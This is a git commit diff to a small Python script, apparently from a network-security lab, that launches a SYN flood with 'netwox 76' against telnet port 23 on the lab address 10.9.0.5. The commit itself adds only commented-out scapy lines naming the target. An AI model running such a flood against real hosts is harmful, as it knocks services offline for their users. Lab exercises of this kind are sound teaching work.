dfa1d47c473cdf5ee06b60c71342524f9c2d4fda
akhilesh-sharda <akhilesh.sharda31@gmail.com>
2022-04-11 23:48:40 -0400

    Add files via upload
    Changes in the code

--- SYN_FLOODING/Volumes/syn_flood.py
+++ SYN_FLOODING/Volumes/syn_flood.py
@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
 import os
+# from scapy.all import *
+
+# target_ip ="10.9.0.5"
+
+# target_port = 23
 
 bashCommand = "netwox 76 -i 10.9.0.5 -p 23 -s raw"
 os.system(bashCommand)
